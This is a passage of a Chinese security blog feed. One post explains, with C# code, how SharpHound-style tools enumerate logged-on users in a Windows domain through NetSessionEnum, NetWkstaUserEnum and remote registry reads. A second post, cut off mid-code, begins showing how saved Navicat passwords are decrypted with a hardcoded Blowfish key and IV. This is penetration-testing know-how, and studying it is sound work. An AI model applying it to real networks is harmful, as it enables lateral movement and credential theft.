    <content type="html"><![CDATA[<p>2018 年3月，<code>BooldHound</code> 发表了篇博文  <a href="https://blog.cptjesus.com/posts/sharphoundtargeting" target="_blank" rel="noopener">SharpHound: Target Selection and API Usage</a> 。这里面介绍了一些关于收集 <code>BooldHound</code> 所需信息的收集方法及所使用的 <code>API</code>。而本文主要介绍两个关于收集会话信息的 <code>API</code>及利用远程注册表的方法（翻译+补充），也是对<a href="https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%86%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF/">【域渗透】获取域环境内用户登录信息</a> 的一个补充。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>使用过<code>BooldHound</code> 的朋友都知道，它所呈现出来非常多的信息，基本能满足日常信息收集所需的数据，但是之前使用的时候，就很惊讶，它们的会话关系数据来源是怎么来的，所幸后来官方给了解释。</p><h2 id="0x01-会话收集"><a href="#0x01-会话收集" class="headerlink" title="0x01 会话收集"></a>0x01 会话收集</h2><p><code>BooldHound</code> 公开了三种不同的查询计算机会话信息的方法，都是从检查 445 端口开始的。</p><h3 id="1）、NetSessionEnum"><a href="#1）、NetSessionEnum" class="headerlink" title="1）、NetSessionEnum"></a>1）、NetSessionEnum</h3><p>它不允许直接查询是谁登陆了此工作站，但是它允许查询是谁在访问此工作站的网络资源（例如文件共享）时所创建的网络会话，从而知道来自何处。当然这里最好的查询对象是域控 + 文件共享服务器。此函数不需要高权限。</p><p>该函数原型是：</p><p><img src="/image/【域渗透】域内会话收集/Blog_2019-09-19_12-34-12.png" alt=""></p><p>它需要 9 个参数，我们只需了解其中的 5 个参数即可：</p><ul><li><strong>servername：</strong>该字符串指定要在其上执行函数的远程服务器的DNS或NetBIOS名称。如果此参数为<code>NULL</code>，则使用本地计算机。</li><li><strong>UncClientName：</strong>该字符串指定要为其返回信息的计算机会话的名称。如果此参数为 <code>NULL</code>，则 <code>NetSessionEnum</code> 将返回服务器上所有计算机会话的信息。</li><li><strong>username：</strong>该字符串指定要为其返回信息的用户的名称。如果此参数为 <code>NULL</code>，则 <code>NetSessionEnum</code> 将返回所有用户的信息。</li><li><strong>level：</strong>指定数据的信息级别。</li><li><strong>bufptr：</strong>指向接收数据的缓冲区的指针。此数据的格式取决于 <code>level</code> 参数的值。此缓冲区由系统分配，必须使用 <a href="https://docs.microsoft.com/windows/desktop/api/lmapibuf/nf-lmapibuf-netapibufferfree" target="_blank" rel="noopener">NetApiBufferFree</a> 函数释放 。请注意，即使函数因 <code>ERROR_MORE_DATA</code> 而失败，也必须释放缓冲区。</li></ul><p>而此 API 的调用示例为：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> server = <span class="string">"rcoil.me"</span></span><br><span class="line">nStatus = NetSessionEnum(server, <span class="literal">null</span>, <span class="literal">null</span>, <span class="number">10</span>, <span class="keyword">out</span> Bufptr, <span class="number">-1</span>, <span class="keyword">ref</span> dwEntriesread, <span class="keyword">ref</span> dwTotalentries, <span class="keyword">ref</span> dwResume_handle);</span><br></pre></td></tr></table></figure><p>其中，<code>level</code> 的数值为10，是唯一以未经身份验证的方式获取所需数据的级别。</p><p>它会返回如下内容：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sesi10_cname - <span class="number">192.10</span><span class="number">.22</span><span class="number">.102</span></span><br><span class="line">sesi10_username - RcoIl</span><br><span class="line">sesi10_time - <span class="number">0</span></span><br><span class="line">sesi10_idle_time - <span class="number">0</span></span><br></pre></td></tr></table></figure><p>关键源码如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 返回指定服务器的所有 SESSIONS。返回 SESSION_INFO_10 结构的数组。</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> https://www.pinvoke.net/default.aspx/netapi32/NetSessionEnum.html</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="server"&gt;</span>默认所有域内机器，隐形目标：域控制器+共享服务器<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span>SESSION_INFO_10 STRUCTURE ARRAY<span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SESSION_INFO_10[] <span class="title">EnumSessions</span>(<span class="params"><span class="keyword">string</span> server</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  IntPtr Bufptr;</span><br><span class="line">  <span class="keyword">int</span> nStatus = <span class="number">0</span>;</span><br><span class="line">  Int32 dwEntriesread = <span class="number">0</span>, dwTotalentries = <span class="number">0</span>, dwResume_handle = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  Bufptr = (IntPtr)Marshal.SizeOf(<span class="keyword">typeof</span>(SESSION_INFO_10));</span><br><span class="line">  SESSION_INFO_10[] results = <span class="keyword">new</span> SESSION_INFO_10[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    nStatus = NetSessionEnum(server, <span class="literal">null</span>, <span class="literal">null</span>, <span class="number">10</span>, <span class="keyword">out</span> Bufptr, <span class="number">-1</span>, <span class="keyword">ref</span> dwEntriesread, <span class="keyword">ref</span> dwTotalentries, <span class="keyword">ref</span> dwResume_handle);</span><br><span class="line">    results = <span class="keyword">new</span> SESSION_INFO_10[dwEntriesread];</span><br><span class="line">    <span class="keyword">if</span> (nStatus == (<span class="keyword">int</span>)NERR.ERROR_MORE_DATA || nStatus == (<span class="keyword">int</span>)NERR.NERR_Success)</span><br><span class="line">    &#123;</span><br><span class="line">      Int32 p = Bufptr.ToInt32();</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwEntriesread; i++)</span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">        SESSION_INFO_10 si = (SESSION_INFO_10)Marshal.PtrToStructure(<span class="keyword">new</span> IntPtr(p), <span class="keyword">typeof</span>(SESSION_INFO_10));</span><br><span class="line">        results[i] = si;</span><br><span class="line">        p += Marshal.SizeOf(<span class="keyword">typeof</span>(SESSION_INFO_10));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//NetApiBufferFree(BufPtr);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 释放先前从进程的非托管内存分配的内存。</span></span><br><span class="line">    Marshal.FreeHGlobal(Bufptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (nStatus == (<span class="keyword">int</span>)NERR.ERROR_MORE_DATA);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2）、NetWkstaUserEnum"><a href="#2）、NetWkstaUserEnum" class="headerlink" title="2）、NetWkstaUserEnum"></a>2）、NetWkstaUserEnum</h3><p>该 <strong>NetWkstaUserEnum</strong> 功能可以列出当前登录到该工作站的所有用户的信息。此列表包括交互式、服务和批量登录。此函数需要主机的管理权限或这域管权限，适用于自检使用。</p><p>该函数原型是：</p><p><img src="/image/【域渗透】域内会话收集/Blog_2019-09-19_14-38-02.png" alt=""></p><p>它需要 7个参数，我们只需了解其中的 3 个参数即可：</p><ul><li><strong>servername：</strong>该字符串指定要在其上执行函数的远程服务器的DNS或NetBIOS名称。如果此参数为<code>NULL</code>，则使用本地计算机。</li><li><strong>level：</strong>指定数据的信息级别。</li><li><strong>bufptr：</strong>指向接收数据的缓冲区的指针。此数据的格式取决于 <code>level</code> 参数的值。此缓冲区由系统分配，必须使用 <a href="https://docs.microsoft.com/windows/desktop/api/lmapibuf/nf-lmapibuf-netapibufferfree" target="_blank" rel="noopener">NetApiBufferFree</a> 函数释放 。请注意，即使函数因 <code>ERROR_MORE_DATA</code> 而失败，也必须释放缓冲区。</li></ul><p> 而此 API 的调用示例为：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> server = <span class="string">"rcoil.me"</span></span><br><span class="line">nStatus = NetWkstaUserEnum(server, <span class="number">1</span>, <span class="keyword">out</span> Bufptr, <span class="number">32768</span>, <span class="keyword">out</span> dwEntriesread, <span class="keyword">out</span> dwTotalentries, <span class="keyword">ref</span> dwResumehandle);</span><br></pre></td></tr></table></figure><p>其中，<code>level</code> 的数值为1，是因为 1 比 0 返回的数据多，因此选择了 1。</p><p>它会返回如下内容：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wkui1_username - Administrator</span><br><span class="line">wkui1_logon_domain - RDC_1</span><br><span class="line">wkui1_oth_domains -</span><br><span class="line">wkui1_logon_server - RCOIL</span><br></pre></td></tr></table></figure><p>关键源码如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> API 调用的第二个参数是 API 调用的级别，其中 1 返回的数据多于 0，所以选择 1进行测试</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> https://www.pinvoke.net/default.aspx/netapi32/netwkstauserenum.html</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="server"&gt;</span>默认所有域内机器，隐形目标：域控制器+共享服务器<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> WKSTA_USER_INFO_1[] <span class="title">EnumWkstaUser</span>(<span class="params"><span class="keyword">string</span> server</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  IntPtr Bufptr;</span><br><span class="line">  <span class="keyword">int</span> nStatus = <span class="number">0</span>;</span><br><span class="line">  Int32 dwEntriesread = <span class="number">0</span>, dwTotalentries = <span class="number">0</span>, dwResumehandle = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  Bufptr = (IntPtr)Marshal.SizeOf(<span class="keyword">typeof</span>(WKSTA_USER_INFO_1));</span><br><span class="line">  WKSTA_USER_INFO_1[] results = <span class="keyword">new</span> WKSTA_USER_INFO_1[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    nStatus = NetWkstaUserEnum(server, <span class="number">1</span>, <span class="keyword">out</span> Bufptr, <span class="number">32768</span>, <span class="keyword">out</span> dwEntriesread, <span class="keyword">out</span> dwTotalentries, <span class="keyword">ref</span> dwResumehandle);</span><br><span class="line">    results = <span class="keyword">new</span> WKSTA_USER_INFO_1[dwEntriesread];</span><br><span class="line">    <span class="keyword">if</span> ((nStatus == NERR_SUCCESS) || (nStatus == ERROR_MORE_DATA))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (dwEntriesread &gt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        IntPtr pstruct = Bufptr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwEntriesread; i++)</span><br><span class="line">        &#123;</span><br><span class="line">          WKSTA_USER_INFO_1 wui1 = (WKSTA_USER_INFO_1)Marshal.PtrToStructure(pstruct, <span class="keyword">typeof</span>(WKSTA_USER_INFO_1));</span><br><span class="line">          results[i] = wui1;</span><br><span class="line">          pstruct = (IntPtr)((<span class="keyword">int</span>)pstruct + Marshal.SizeOf(<span class="keyword">typeof</span>(WKSTA_USER_INFO_1)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Bufptr != IntPtr.Zero)</span><br><span class="line">      NetApiBufferFree(Bufptr);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">while</span> (nStatus == ERROR_MORE_DATA);</span><br><span class="line">  <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3）、远程注册表"><a href="#3）、远程注册表" class="headerlink" title="3）、远程注册表"></a>3）、远程注册表</h3><p>此方法仅为辅助启用。尝试打开远程注册表的用户配置单元（如果已启用），并将查找与 SID 格式匹配的子项，这些对应于登录用户将获取的 SID 转换成用户名即可。一般来说，需要域管权限去操作，而在极少数情况下，无需管理员权限即可访问此数据，这个得看脸。</p><p>此处使用 <code>OpenRemoteBaseKey()</code> 函数。    </p><p><img src="/image/【域渗透】域内会话收集/Blog_2019-09-20_11-44-13.png" alt=""></p><p>它需要 2 个参数：</p><ul><li><strong>RegistryHive：</strong>来自 <a href="https://docs.microsoft.com/en-us/dotnet/api/microsoft.win32.registryhive?view=netframework-4.8" target="_blank" rel="noopener">RegistryHive</a> 的枚举。这里选择 <code>Users</code>，表示 <code>HKEY_USERS</code>。</li><li><strong>string：</strong>表示远程主机。</li></ul><p>此函数的调用示例为：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> key = RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, server);</span><br></pre></td></tr></table></figure><p>它会返回如下内容：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">HKEY_USERS</span></span><br></pre></td></tr></table></figure><p>然后读取 <code>HKEY_USERS</code> 的键项就可以了。关键源码如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 利用 OpenRemoteBaseKey 读取 HKEY_USERS 的键项</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="server"&gt;</span><span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> IEnumerable&lt;<span class="keyword">string</span>&gt; <span class="title">GetRegistryLoggedOn</span>(<span class="params"><span class="keyword">string</span> server</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> users = <span class="keyword">new</span> List&lt;<span class="keyword">string</span>&gt;();</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 远程打开注册表配置单元，如果它不是我们当前的配置单元</span></span><br><span class="line">    RegistryKey key = RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, server);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到与我们的正则表达式匹配的所有子项</span></span><br><span class="line">    <span class="keyword">var</span> filtered = key.GetSubKeyNames().Where(sub =&gt; SidRegex.IsMatch(sub));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">var</span> subkey <span class="keyword">in</span> filtered)</span><br><span class="line">    &#123;</span><br><span class="line">      users.Add(subkey);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (Exception)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span> (<span class="keyword">var</span> user <span class="keyword">in</span> users.Distinct())</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">return</span> user;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后将 用户的SID 转成用户名即可。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> Username = <span class="keyword">new</span> SecurityIdentifier(regSID).Translate(<span class="keyword">typeof</span>(NTAccount)).ToString();</span><br></pre></td></tr></table></figure><h3 id="4）、结果"><a href="#4）、结果" class="headerlink" title="4）、结果"></a>4）、结果</h3><p><img src="/image/【域渗透】域内会话收集/Blog_2019-09-20_12-53-42.png" alt=""></p><h2 id="0x02-备忘录"><a href="#0x02-备忘录" class="headerlink" title="0x02 备忘录"></a>0x02 备忘录</h2><table><thead><tr><th style="text-align:left">API 调用</th><th style="text-align:center">协议</th><th style="text-align:center">端口</th><th style="text-align:left">RPC 接口 UUID</th><th style="text-align:left">命名管道</th><th style="text-align:left">RPC 方法</th></tr></thead><tbody><tr><td style="text-align:left"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/bb525382(v=vs.85" target="_blank" rel="noopener">NetSessionEnum</a>.aspx)</td><td style="text-align:center">[MS-SRVS]: Server Service Remote Protocol</td><td style="text-align:center">TCP 445</td><td style="text-align:left">4B324FC8-1670-01D3-1278-5A47BF6EE188</td><td style="text-align:left">\PIPE\srvsvc</td><td style="text-align:left"><a href="https://msdn.microsoft.com/en-us/library/cc247273.aspx" target="_blank" rel="noopener">NetrSessionEnum</a></td></tr><tr><td style="text-align:left"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa370669(v=vs.85" target="_blank" rel="noopener">NetWkstaUserEnum</a>.aspx)</td><td style="text-align:center">[MS-WKST]: Workstation Service Remote Protocol</td><td style="text-align:center">TCP 445</td><td style="text-align:left">6BFFD098-A112-3610-9833-46C3F87E345A</td><td style="text-align:left">\PIPE\wkssvc</td><td style="text-align:left"><a href="https://msdn.microsoft.com/en-us/library/cc250349.aspx" target="_blank" rel="noopener">NetrWkstaUserEnum</a></td></tr></tbody></table><p>Github 项目地址：<a href="https://github.com/RcoIl/CSharp-Tools/tree/master/SharpDomainSession" target="_blank" rel="noopener">SharpDomainSession</a> ，此项目仅供实验使用 Demo。如想更进一步利用，可移至 <a href="https://github.com/BloodHoundAD/SharpHound" target="_blank" rel="noopener">SharpHound</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2018 年3月，&lt;code&gt;BooldHound&lt;/code&gt; 发表了篇博文  &lt;a href=&quot;https://blog.cptjesus.com/posts/sharphoundtargeting&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SharpHound: Target Selection and API Usage&lt;/a&gt; 。这里面介绍了一些关于收集 &lt;code&gt;BooldHound&lt;/code&gt; 所需信息的收集方法及所使用的 &lt;code&gt;API&lt;/code&gt;。而本文主要介绍两个关于收集会话信息的 &lt;code&gt;API&lt;/code&gt;及利用远程注册表的方法（翻译+补充），也是对&lt;a href=&quot;https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%86%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF/&quot;&gt;【域渗透】获取域环境内用户登录信息&lt;/a&gt; 的一个补充。&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>【编程】SharpDecryptPwd</title>
    <link href="https://rcoil.me/2019/09/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/"/>
    <id>https://rcoil.me/2019/09/【编程】SharpDecryptPwd/</id>
    <published>2019-09-01T06:37:56.000Z</published>
    <updated>2019-11-01T02:28:14.624Z</updated>
    
    <content type="html"><![CDATA[<p>这是一篇对密码已保存在 Windwos 系统上的部分程序进行解析。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在 <code>Windows</code> 系统下保存密码，无非就只存在于两个位置：<strong><em>注册表</em></strong>、<strong><em>文件</em></strong>。所以下文主要也是从注册表项、session文件中获取相关加密后的密码字段。且文章中所涉及的知识点，出处全在文末来源参考中，本文仅仅是个人的理解及整合。</p><p>主要对以下几个程序进行解析</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、Navicat PremiumSoft</span><br><span class="line">2、SQL<span class="built_in"> Server </span>Management Studio</span><br><span class="line">3、Xmanager --&gt; Xshell,Xftp</span><br><span class="line">4、TeamView</span><br><span class="line">5、FileZille</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span></span><br></pre></td></tr></table></figure><p><strong>PS:</strong> 可以使用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" rel="noopener">Process Monitor </a> 监测进程的操作。</p><h2 id="0x01-Navicat-PremiumSoft"><a href="#0x01-Navicat-PremiumSoft" class="headerlink" title="0x01 Navicat PremiumSoft"></a>0x01 Navicat PremiumSoft</h2><p>​        <code>Navicat</code> 的 session 信息是保存在注册表中的。以 <code>MySql</code> 为例</p><p><img src="/image/【编程】SharpDecryptPwd/blog_2019-08-23_16-34-53.png" alt=""></p><p><center> Navicat 中的 MySQL 配置（注册表路径）</center><br>​        上图注册表中，保存着我们需要的<strong><em>Host</em></strong>、<strong><em>UserName</em></strong>、<strong><em>PassWord</em></strong>等字段。以下是数据库类型对应注册表路径表</p><table><tr><th width="20%" bgcolor="#eea236">数据库类型</th><th width="80%" style="text-align:center" bgcolor="rgb(92," 184,="" 92)="">注册表路径</th></tr><tr><td> MySQL </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers</td></tr><tr><td> MariaDB </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers</td></tr><tr><td> MongoDB </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers</td></tr><tr><td> Microsoft SQL </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers</td></tr><tr><td> Oracle </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers</td></tr><tr><td> PostgreSQL </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers</td></tr><tr><td> SQLite </td><td> HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers</td></tr></table><h3 id="1-1-如何加密"><a href="#1-1-如何加密" class="headerlink" title="1.1 如何加密"></a>1.1 如何加密</h3><p>Navicat 使用 <code>Blowfish算法（河豚密码）</code>加密密码字符串。以下是 Navicat 所做的事情：</p><ul><li>生成密钥</li></ul><ol><li>Navicat使用SHA-1算法生成160位密钥；</li><li>对 <code>3DC5CA39</code> 字符串取其 <code>SHA-1摘要</code>，长度为8个字节，这字符串是 <code>Blowfish算法</code>中使用的密钥；</li><li>确切的值是：<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] Key = &#123;</span><br><span class="line"><span class="number">0x42</span>, <span class="number">0xCE</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>, <span class="number">0xA5</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0xB7</span>, <span class="number">0x4A</span>, <span class="number">0xEA</span>, <span class="number">0x93</span>, <span class="number">0x94</span>,</span><br><span class="line"><span class="number">0x79</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x43</span>, <span class="number">0x91</span>, <span class="number">0x87</span>, <span class="number">0x33</span>, <span class="number">0x40</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><ul><li>初始化向量（IV）</li></ul><ol><li>因为 <code>Blowfish算法</code>每次只能加密一个<strong>8字节长的块</strong>；</li><li>所以开始时，Navicat 用 <code>0xFF</code> 填充一个<strong>8字节长的块</strong>，然后利用上面提到的 Key 进行 Blowfish 加密，得到 8字节长的初始向量（IV）；</li><li>确切的值是：<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] IV = &#123;</span><br><span class="line"><span class="number">0xD9</span>, <span class="number">0xC7</span>, <span class="number">0xC3</span>, <span class="number">0xC8</span>, <span class="number">0x87</span>, <span class="number">0x0D</span>, <span class="number">0x64</span>, <span class="number">0xBD</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><ul><li>加密 rawPass 字符串</li></ul><ol><li><strong>rawPass</strong> 字符串是ASCII字符串，且不考虑 “NULL” 终止符。</li><li>Navicat 使用管道来加密 <strong>rawPass</strong> 字符串。管道如下所示：</li></ol><p><img src="/image/【编程】SharpDecryptPwd/EncryptionPipeline.png" alt=""></p><p><center>Blowfish 加密</center><br><strong><em>注意：</em></strong>每个明文块都是一个8字节长的块。只有当最后一个明文块不是8字节长时，才能执行上图中显示的最后一步。</p><h3 id="1-2-加密过程（C-）"><a href="#1-2-加密过程（C-）" class="headerlink" title="1.2 加密过程（C#）"></a>1.2 加密过程（C#）</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 